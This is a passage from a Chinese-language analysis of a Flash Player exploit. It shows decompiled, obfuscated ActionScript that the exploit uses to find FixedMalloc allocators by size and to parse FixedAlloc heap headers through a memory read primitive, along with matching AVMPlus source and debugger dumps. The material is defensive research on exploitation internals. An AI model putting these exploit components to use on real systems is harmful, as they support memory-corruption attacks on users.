        return (jjjj222222lpmc. AddInt (M_allocs01, offset));
      };
      return (jjjj222222lpmc. AddInt (M_allocs02, offset));
    }
图32 LocateFixedAllocAddrBySize(jjj34fdfg)函数
下述代码为exploit中的GetSizeClassIndex实现：
    public function Jdfgdf435GwgVfg():void
    {
      ...
      kSizeClassIndex64 = [0, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 22, 23, 23, 24, 24, 25, 26, 26, 27, 27, 28,
      28, 28, 29, 29, 30, 30, 30, 30, 31, 31, 31, 32, 32, 32, 32, 32, 33, 33, 33, 33, 33, 33, 34, 34, 34, 34, 34, 34, 34, 35, 35, 35, 35, 35, 35, 35, 35, 35,
      36, 36, 36, 36, 36, 36, 36, 36, 36, 36, 36, 36, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38,
      38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39,
      39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40,
      40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40,
      40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40];
      kSizeClassIndex32 = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 17, 18, 18, 19, 19, 20, 21, 22, 23, 24, 24, 25, 26, 26, 27, 27,
      28, 28, 28, 29, 29, 29, 30, 30, 30, 31, 31, 31, 31, 32, 32, 32, 32, 33, 33, 33, 33, 33, 33, 34, 34, 34, 34, 34, 34, 34, 35, 35, 35, 35, 35, 35, 35, 35,
      35, 36, 36, 36, 36, 36, 36, 36, 36, 36, 36, 36, 36, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 38, 38, 38, 38, 38, 38, 38, 38,
      38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39,
      39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40,
      40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40,
      40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40];
      ...
    }
    public function GetSizeClassIndex (arg_size:int) : int
    {
      if(is64bit)
      {
        return kSizeClassIndex64[arg_size + 7 >> 3];
      }
      return kSizeClassIndex32[arg_size + 7 >> 3];
    }
图33 GetSizeClassIndex函数
可以发现这和AVMPlus开源项目中的FixedMalloc::FindAllocatorForSize函数实现是相似的。
    REALLY_INLINE FixedAllocSafe* FixedMalloc::FindAllocatorForSize(size_t size)
    {
      ...
      // 'index' is (conceptually) "(size8>>3)" but the following
      // optimization allows us to skip the &~7 that is redundant
      // for non-debug builds.
    #ifdef MMGC_64BIT
      unsigned const index = kSizeClassIndex[((size+7)>>3)];
    #else
      // The first bucket is 4 on 32-bit systems, so special case that rather
      // than double the size-class-index table.
      unsigned const index = (size >3)];
    #endif
      ...
      return &m_allocs[index];
    }
图34 FixedMalloc::FindAllocatorForSize函数
    class FixedMalloc
    {
      ...
      FixedAllocSafe m_allocs[kNumSizeClasses]; // The array of size-segregated allocators for small objects, set in InitInstance
      ...
图35 m_allocs数组变量的声明
下述为AVMplus项目中定义的kSizeClassIndex数组，可以看到它们具有相同的索引值。
    #ifdef MMGC_64BIT
    /*static*/ const uint8_t FixedMalloc::kSizeClassIndex[kMaxSizeClassIndex] = {
      0, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
      15, 16, 17, 18, 19, 20, 21, 22, 22, 23, 23, 24, 24, 25, 26, 26,
      27, 27, 28, 28, 28, 29, 29, 30, 30, 30, 30, 31, 31, 31, 32, 32,
      32, 32, 32, 33, 33, 33, 33, 33, 33, 34, 34, 34, 34, 34, 34, 34,
      35, 35, 35, 35, 35, 35, 35, 35, 35, 36, 36, 36, 36, 36, 36, 36,
      36, 36, 36, 36, 36, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37,
      37, 37, 37, 37, 37, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38,
      38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 39,
      39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39,
      39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39,
      39, 39, 39, 39, 39, 39, 39, 39, 39, 40, 40, 40, 40, 40, 40, 40,
      40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40,
      40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40,
      40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40,
      40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40,
      40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40
    };
    #else
    /*static*/ const uint8_t FixedMalloc::kSizeClassIndex[kMaxSizeClassIndex] = {
      0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15,
      16, 17, 17, 18, 18, 19, 19, 20, 21, 22, 23, 24, 24, 25, 26, 26,
      27, 27, 28, 28, 28, 29, 29, 29, 30, 30, 30, 31, 31, 31, 31, 32,
      32, 32, 32, 33, 33, 33, 33, 33, 33, 34, 34, 34, 34, 34, 34, 34,
      35, 35, 35, 35, 35, 35, 35, 35, 35, 36, 36, 36, 36, 36, 36, 36,
      36, 36, 36, 36, 36, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37,
      37, 37, 37, 37, 37, 37, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38,
      38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38,
      39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39,
      39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39,
      39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 40, 40, 40, 40, 40, 40,
      40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40,
      40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40,
      40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40,
      40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40,
      40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40
    };
    #endif
图36 AVMplus项目中的kSizeClassIndex定义
#### ParseFixedAllocHeader
FixedAlloc类的定义中包含有指向FixedBlock链表的指针，那些具有相同大小的内存块会被添加到同一链表中。
    class FixedAlloc
    {
      ...
      private:
       GCHeap *m_heap;           // The heap from which we obtain memory
       uint32_t m_itemsPerBlock; // Number of items that fit in a block
       uint32_t m_itemSize;      // Size of each individual item
       FixedBlock* m_firstBlock; // First block on list of free blocks
       FixedBlock* m_lastBlock;  // Last block on list of free blocks
       FixedBlock* m_firstFree;  // The lowest priority block that has free items
       size_t m_numBlocks;       // Number of blocks owned by this allocator
      ...
图37 FixedAlloc类的定义
而ParseFixedAllocHeader(cvb45)函数将用于解析FixedAlloc对象，它会通过ReadPointer(ghgfhf12341)函数实现的RW
primitive功能来读取内存中相应位置的数据。
    public function ParseFixedAllocHeader(_arg_1:ByteArray, _arg_2:___Int64):Object
    {
      var _local_3:* = null;
      if (cbvd43) // true when major version >= 20
      {
        return ({
          "m_heap":jjjj222222lpmc.ReadPointer(_arg_1),
          "m_unknown":_arg_1.readUnsignedInt(),
          "m_itemsPerBlock":_arg_1.readUnsignedInt(),
          "m_itemSize":_arg_1.readUnsignedInt(),
          "m_firstBlock":jjjj222222lpmc.ReadPointer(_arg_1),
          "m_lastBlock":jjjj222222lpmc.ReadPointer(_arg_1),
          "m_firstFree":jjjj222222lpmc.ReadPointer(_arg_1),
          "m_maxAlloc":jjjj222222lpmc.ReadPointer(_arg_1),
          "m_isFixedAllocSafe":_arg_1.readByte(),
          "m_spinlock":jjjj222222lpmc.ReadPointer(_arg_1),
          "fixedAllocAddr":_arg_2
          });
      };
      return ({
        "m_heap":jjjj222222lpmc.ReadPointer(_arg_1),
        "m_unknown":0,
        "m_itemsPerBlock":_arg_1.readUnsignedInt(),
        "m_itemSize":_arg_1.readUnsignedInt(),
        "m_firstBlock":jjjj222222lpmc.ReadPointer(_arg_1),
        "m_lastBlock":jjjj222222lpmc.ReadPointer(_arg_1),
        "m_firstFree":jjjj222222lpmc.ReadPointer(_arg_1),
        "m_maxAlloc":jjjj222222lpmc.ReadPointer(_arg_1),
        "m_isFixedAllocSafe":_arg_1.readByte(),
        "m_spinlock":jjjj222222lpmc.ReadPointer(_arg_1),
        "fixedAllocAddr":_arg_2
        });
    }
图38 ParseFixedAllocHeader函数
来看下面的例子，ParseFixedAllocHeaderBySize(ghfgfh23)函数中给定的堆大小为0x7f0，它将返回解析好的堆块结构。
    Enter: Jdfgdfgd34/instance/ghfgfh23(000007f0, True)
    ...
    Return: Jdfgdfgd34/instance/ghfgfh23 [object Object]
    * Return: Jdfgdfgd34/instance/ghfgfh23 [object Object]
     Location: Jdfgdfgd34/instance/ghfgfh23 block id: 0 line no: 0
     Call Stack:
     Jdfgdfgd34/ghfgfh23()
     Jdfgdfgd34/hhh222()
     J34534534/fdgdfg45345345()
     J34534534/jhfjhhg2432324()
     ...
     Type: Return
     Method: Jdfgdfgd34/instance/ghfgfh23
     Return Value:
     Object:
     m_itemSize: 0x7f0 (2032) // current item size
      fixedAllocAddr:
      high: 0x0 (0)
      low: 0x6fb7c36c (1874314092)
     m_firstFree:
      high: 0x0 (0)
      low: 0x0 (0)
     m_lastBlock:
      high: 0x0 (0)
      low: 0xc0d7000 (202207232)
     m_spinlock:
      high: 0x0 (0)
      low: 0x0 (0)
     m_unknown: 0x1 (1)
     m_isFixedAllocSafe: 0x1 (1)
     m_maxAlloc:
      high: 0x0 (0)
      low: 0x1 (1)
     m_itemsPerBlock: 0x2 (2)
     m_heap:
      high: 0x0 (0)
      low: 0x6fb7a530 (1874306352)
     m_firstBlock:
      high: 0x0 (0)
      low: 0xc0d7000 (202207232)
图39 ParseFixedAllocHeaderBySize(ghfgfh23)函数
返回结果中包含有堆块的首部结构，其中偏移0xc处的DWORD值正好为要查找的大小0x7f0。
    0:000> dds 6fb7c36c <-- fixedAllocAddr
    6fb7c36c 6fb7a530 <-- m_heap
    6fb7c370 00000001 <-- m_unknown
    6fb7c374 00000002 <-- m_itemsPerBlock
    6fb7c378 000007f0 <-- m_itemSize
    6fb7c37c 0c0d7000 <-- m_firstBlock
    6fb7c380 0c0d7000 <-- m_lastBlock
    6fb7c384 00000000 <-- m_firstFree
    6fb7c388 00000001 <-- m_maxAlloc
    6fb7c38c 00000001 
图40 返回的FixedAlloc结构